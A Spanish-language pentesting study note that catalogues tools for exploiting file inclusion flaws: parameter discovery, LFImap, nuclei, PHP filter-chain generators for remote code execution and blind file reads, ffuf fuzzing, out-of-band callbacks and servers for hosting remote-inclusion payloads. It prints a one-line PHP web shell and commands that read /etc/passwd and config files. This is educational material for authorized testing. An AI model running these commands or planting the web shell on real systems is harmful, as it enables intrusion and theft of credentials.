---
tags:
  - Web/Red-Team
  - Pentesting/Enumeracion
  - Pentesting/Explotacion
  - File-Inclusion
Fecha de actualización: 2026-06-22
Nota previa: "[[10 - Prevención de File Inclusion]]"
Nota siguiente: ""
Area: "[[File Inclusion.base|File Inclusion]]"
---
---

Inventario de las herramientas que cubren el ciclo completo de file inclusion: descubrimiento de parámetros → [[08 - Detección y fuzzing automatizado|detección]] → explotación (RCE y lectura ciega) → [[09 - Evasión de WAF y restricciones del servidor|evasión]] → hosting para RFI. <mark style="background: #FFB8EBA6;">El testing manual sigue ganando en casos con WAF o configuración rara</mark>; las herramientas ahorran tiempo en los triviales. Estado de mantenimiento verificado a 2026.

# Descubrimiento de parámetros

```shell-session
# Arjun (Python 3, mantenida) — GET/POST/JSON/headers
$ arjun -u "http://target/index.php"
$ arjun -u "http://target/api/v1/page" -m JSON
$ arjun -u "http://target/page.php" --headers "Cookie: session=abc123"

# x8 (Rust, mantenida) — más rápido, mejor con valores específicos
$ x8 -u "http://target/page.php" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

# Detección y explotación automatizada

**LFImap** ([hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap), Python 3, **mantenida**) es el todo-en-uno actual: prueba traversal, wrappers (`php://filter`, `data://`, `expect://`, `input://`), log poisoning, `/proc/self/*` y RFI en un solo binario.

```shell-session
$ pip3 install lfimap
$ lfimap -u "http://target/index.php?lang=test" -a            # all attacks
$ lfimap -u "http://target/page.php?file=test" --cookie "session=abc123" -a
$ lfimap -u "http://target/page.php?file=test" --lfi --os linux   # solo LFI
$ lfimap -u "http://target/page.php" -p "file=test" --post -a
```

```shell-session
# nuclei (Go, mantenida) — scanning masivo con templates LFI/CVE
$ nuclei -u http://target -tags lfi,path-traversal
$ nuclei -l targets.txt -tags lfi,path-traversal -o lfi.txt
$ nuclei -u http://target -id CVE-2025-30208           # Vite arbitrary file read
```

# LFI → RCE y lectura ciega (Synacktiv / Ambionics)

La tríada que convierte una LFI moderna en RCE o en lectura de ficheros sin salida (detalle conceptual en [[04 - PHP wrappers II - RCE y filter chains|filter chains]]):

```shell-session
# RCE sin upload ni allow_url_include — genera la cadena php://filter
$ python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
# (pegar la salida en el parámetro vulnerable y añadir &cmd=id)

# Lectura de ficheros en LFI CIEGA (error-based oracle)
$ python3 filters_chain_oracle_exploit.py \
    --target "http://target/index.php" --file "/etc/passwd" --parameter "lang"
$ python3 filters_chain_oracle_exploit.py \
    --target "http://target/index.php" --file "/var/www/html/config.php" \
    --parameter "lang" --verb POST

# wrapwrap — prefijo/sufijo arbitrario al fichero incluido (sinks que parsean JSON/XML)
$ python3 wrapwrap.py /etc/passwd '{"file":"' '"}' 2048
```

Repos: [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) · [php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit) · [wrapwrap](https://github.com/ambionics/wrapwrap) — todos Python 3, activos.

# Fuzzing y wordlists

```shell-session
# Parámetro vulnerable
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
    -u 'http://target/index.php?FUZZ=../../../../etc/passwd' -mc 200 -fs 0

# Payloads LFI sobre un parámetro
$ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
    -u 'http://target/index.php?language=FUZZ' -fs 2287

# Webroot (para localizar uploads por ruta absoluta)
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
    -u 'http://target/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

| Wordlist | Ruta | Uso |
| - | - | - |
| `LFI-Jhaddix.txt` | `Fuzzing/LFI/` | Payloads LFI con bypasses y ficheros comunes |
| `default-web-root-directory-linux.txt` | `Discovery/Web-Content/` | Webroots Linux para ruta absoluta |
| `default-web-root-directory-windows.txt` | `Discovery/Web-Content/` | Webroots Windows |
| `burp-parameter-names.txt` | `Discovery/Web-Content/` | Parameter discovery |
| `LFI-WordList-Linux` / `-Windows` | [DragonJAR](https://github.com/DragonJAR/Security-Wordlist) | Logs/config, más preciso (no en SecLists) |

`feroxbuster` (Rust) complementa para *content discovery* recursivo previo a la fase LFI.

# Detección OOB (blind RFI / SSRF)

```shell-session
# interactsh — alternativa open-source a Burp Collaborator (DNS/HTTP/SMTP/LDAP)
$ interactsh-client -server oast.pro
# Inyectar: ?url=http://<subdominio>.oast.pro/x  → si el server llama, confirmado
```

Extensiones **Burp/Caido** útiles: `Param Miner` (parámetros ocultos), `Backslash Powered Scanner` (sinks no convencionales, template injection), `Collaborator Everywhere` / `Taborator` (callbacks OOB en todos los parámetros).

# Hosting para RFI

```shell-session
$ python3 -m http.server 80                              # HTTP simple
$ updog -p 80                                            # HTTP con upload (abandonado; si no, python http.server)
$ python3 -m pyftpdlib -p 21 -w                          # FTP (ftp://)
$ impacket-smbserver share $(pwd) -smb2support           # SMB UNC (Windows, sin allow_url_include)
```

Web shell mínimo a alojar: `<?php system($_GET['cmd']); ?>`. Para reverse shell tras RCE, ver [[01 - Explotación básica - web shells y reverse shells|web shells y reverse shells]] del módulo File Upload.

# Estado de mantenimiento (2026)

| Herramienta | Lenguaje | Estado | Uso principal |
| - | - | - | - |
| **LFImap** | Python 3 | ✅ Activa | Escaneo/explotación LFI todo-en-uno |
| **php_filter_chain_generator** | Python 3 | ✅ Activa | LFI→RCE sin upload |
| **php_filter_chains_oracle_exploit** | Python 3 | ✅ Activa | Lectura de ficheros en LFI ciega |
| **wrapwrap** | Python 3 | ✅ Activa | Prefijo/sufijo en fichero incluido |
| **ffuf / feroxbuster** | Go / Rust | ✅ Activa | Fuzzing de params/rutas |
| **Arjun / x8** | Python 3 / Rust | ✅ Activa | Parameter discovery |
| **nuclei** | Go | ✅ Activa | Scanning masivo + CVEs |
| **interactsh** | Go | ✅ Activa | OOB blind RFI/SSRF |
| **dotdotpwn** | Perl | 🟡 Legado (en Kali) | Traversal multi-protocolo (FTP/SMB) |
| **kadimus** | C | ❌ Archivada (2020) | — no usar |
| **LFISuite** | Python 2 | ❌ Abandonada | — no usar |
| **fimap** | Python 2 | ❌ Abandonada | — no usar |
| **liffy** | Python 3 (fork) | ⚠️ Incierta | Preferir LFImap |

> [!warning]+ Las herramientas clásicas están muertas
> `LFISuite`, `fimap` y `kadimus` —las que citan tutoriales antiguos y el propio módulo HTB— están en **Python 2 o archivadas**. No pierdas tiempo instalándolas: para black-box usa **LFImap**, y para la explotación moderna (RCE/ciega) las herramientas de **Synacktiv**.

> [!info]+ Fuentes
> - [LFImap](https://github.com/hansmach1ne/LFImap) · [Synacktiv — filter chains](https://github.com/synacktiv/php_filter_chain_generator) · [Ambionics — wrapwrap](https://github.com/ambionics/wrapwrap)
> - [ffuf](https://github.com/ffuf/ffuf) · [Arjun](https://github.com/s0md3v/Arjun) · [x8](https://github.com/Sh1Yo/x8) · [nuclei-templates](https://github.com/projectdiscovery/nuclei-templates) · [interactsh](https://github.com/projectdiscovery/interactsh)
> - [SecLists — Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

Con el arsenal cierra el sub-tema de File Inclusion. La MOC del tema agrupa todas las notas: [[File Inclusion.base|File Inclusion]].
